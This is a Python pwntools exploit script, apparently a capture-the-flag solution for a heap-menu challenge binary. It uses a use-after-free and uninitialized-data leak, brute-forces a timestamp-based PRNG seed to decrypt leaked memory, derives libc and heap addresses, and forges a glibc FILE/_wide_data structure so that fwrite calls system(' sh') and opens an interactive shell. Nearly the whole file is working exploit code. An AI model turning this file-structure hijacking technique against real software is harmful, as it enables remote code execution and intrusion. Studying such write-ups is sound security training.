from pwn import *
from time import sleep
from ctypes import CDLL
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('host', nargs='?', default='localhost', help='host to connect to')
parser.add_argument('port', nargs='?', default=5000, type=int, help='port to connect to')

args = parser.parse_args()

context.binary = elf = ELF('./chall', checksec=False)
dll = CDLL('./libc.so.6')

io = remote(args.host, args.port)


sn, sl, sla = io.send, io.sendline, io.sendlineafter
rl, ru = io.recvline, io.recvuntil
ntr = io.interactive
cs = lambda x: str(x).encode('ascii')

def cc(size: int):
    sla(b'> ', b'1')
    rl()
    sl(cs(size))

def vc(idx: int):
    sla(b'> ', b'2')
    rl()
    sl(cs(idx))
    ru(cs(idx) + b': ')
    return ru(b'\nDone\n', drop=True)

def ec(idx: int, content: bytes):
    sla(b'> ', b'3')
    rl()
    sl(cs(idx))
    rl()
    sn(content)
    sleep(0.1)

def rc(idx: int):
    sla(b'> ', b'4')
    rl()
    sl(cs(idx))

def ocf():
    sla(b'> ', b'5')

def ccf():
    sla(b'> ', b'6')

def wcf(tf=0):
    sla(b'> ', b'7')
    if tf:
        sla(b'Are you sure you want to save? [Y/n]\n', b'y')
        return None
    else:
        ru(b'Writing to chonccfile at timestamp ')
        ts = int(ru(b'...', drop=True))
        sla(b'Are you sure you want to save? [Y/n]\n', b'n')
        return ts

ocf() # cause the file struct to be allocated in the heap
ccf() # closing the chonccfile doesn't clear the contents of the file struct
ts = wcf() # requesting to write the chonccfile prints a UNIX timestamp, which we can use for getting the PRNG seed
assert ts > 0
cc(0x1d0) # achieve a use after free using the uninitialized data access we have after creating a choncc
enc = vc(1) # get the encrypted file struct contents

# you normally won't have to loop back to find the correct timestamp,
# if you have the same system time as the server, which is very likely ;)
# this approach is going on a loop to find the seed for the PRNG
while True:
    dll.srand(ts)
    dec = b''
    for i in range(0, 0x1d0, 4):
        _ = dll.rand()
        dec += p32(u32(enc[i:i+4]) ^ dll.rand())
    # this is how you know if you found the correct timestamp: a closed file struct will be sparse
    if dec.count(b'\x00') > len(dec) // 2:
        break
    ts -= 1

# we only need two leaks: address of file struct and libc base address
# luckily, the file struct keeps some stuff for us to use
fp = u64(dec[0x88:0x90]) - 0xe0 # we leaked the value of _wide_data field, which is next to the _IO_FILE_plus struct
libc = u64(dec[0x68:0x70]) - 0x1f04e0 # we leaked the address of stderr, stored in the _chain field of the file struct

fs = p64(0x687320) # " sh\x00"
# offset 0x08: _IO_read_ptr = _wide_data->_IO_write_base == 0
# offset 0x20: _IO_write_base = _wide_data->_IO_buf_base == 0
# offset 0x68: variable for _lock, which must be set to 0 and is writable
for _ in range(14):
    fs += p64(0)
fs += p64(0xffffffffffffffff)
fs += p64(0)
fs += p64(fp + 0x68) # setting the address that _lock points to
fs += p64(0xffffffffffffffff)
fs += p64(0)
fs += p64(fp - 0x10) # address of the _IO_wide_data struct (_wide_data) so it overlaps with the file struct
for _ in range(4):
    fs += p64(0)
fs += p64(libc + 0x5306e) # system, which is _wide_data->_wide_vtable + 0x68
fs += p64(fp + 0x60) # _wide_data->_wide_vtable
fs += p64(libc + 0x1ee2b0) # this address + 0x38 is the function pointer for _IO_wfile_overflow

# edit the choncc
ec(1, fs)
# now that one chunk we have is a choncc, which is also the file struct, which is also mostly the _wide_data struct
# and most importantly, when we call fwrite, it will eventually call system(" sh\x00")
wcf(1)
ntr()
